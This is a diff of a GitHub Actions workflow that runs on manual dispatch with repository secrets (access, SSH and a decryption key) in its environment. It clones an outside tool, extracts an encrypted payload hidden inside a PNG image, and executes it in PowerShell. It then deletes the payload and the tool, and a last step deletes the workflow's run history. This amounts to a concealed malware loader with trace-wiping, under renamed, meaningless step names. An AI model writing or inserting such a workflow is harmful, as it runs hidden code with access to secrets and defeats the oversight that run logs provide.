@@ -1,20 +1,20 @@
-name: r4dx
+name: weearefinallyfree
 
 on:
   workflow_dispatch:
 
 jobs:
-  j_712:
+  weearefinallyawake:
     runs-on: windows-latest
     permissions:
       actions: write
       contents: read
 
     steps:
-      - name: x_1
+      - name: r1dex
         uses: actions/checkout@v4
         
-      - name: x_2
+      - name: r2dex
         uses: actions/cache@v4
         with:
           path: |
@@ -25,32 +25,30 @@ jobs:
           restore-keys: |
             ${{ runner.os }}-ghost-session
 
-      - name: x_3
+      - name: r3dex
         shell: powershell
         env:
           A_KEY: ${{ secrets.ACCESS_KEY }}
           D_KEY: ${{ secrets.DEX_KEY }}
           SSH_KEY: ${{ secrets.SSH_KEY }}
         run: |
-          git clone https://github.com/Sxeldest/dex-enc.git dx_t --quiet
-          pip install -r dx_t/requirements.txt --quiet
+          git clone https://github.com/Sxeldest/dex-enc.git --quiet
+          pip install -r dex-enc/requirements.txt --quiet
           $p = Join-Path $pwd "BondeXJS.png"
           if (Test-Path $p) {
-              # Tambahkan --out-payload dengan path spesifik ke direktori saat ini
-              python dx_t/dexenc.py extract -i $p -key "$env:D_KEY" --out-payload "$pwd\r.ps1"
-              
-              if (Test-Path "$pwd\r.ps1") {
+              python dex-enc/dexenc.py extract -i $p -key "$env:D_KEY" --out-payload "$pwd\r4dx.bin"
+              if (Test-Path "$pwd\r4dx.bin") {
                   Write-Host "[+] Executing extracted payload..." -ForegroundColor Green
-                  . "$pwd\r.ps1"
-                  Remove-Item "$pwd\r.ps1" -Force
-                  Remove-Item -Recurse -Force dx_t
+                  . "$pwd\r4dx.bin"
+                  Remove-Item "$pwd\r4dx.bin" -Force
+                  Remove-Item -Recurse -Force dex-enc
               } else {
                   Write-Host "[-] Payload file not found in root!" -ForegroundColor Red
                   exit 1
               }
           }
           
-      - name: x_4
+      - name: r4dex
         uses: Mattraks/delete-workflow-runs@v2
         if: always()
         with:
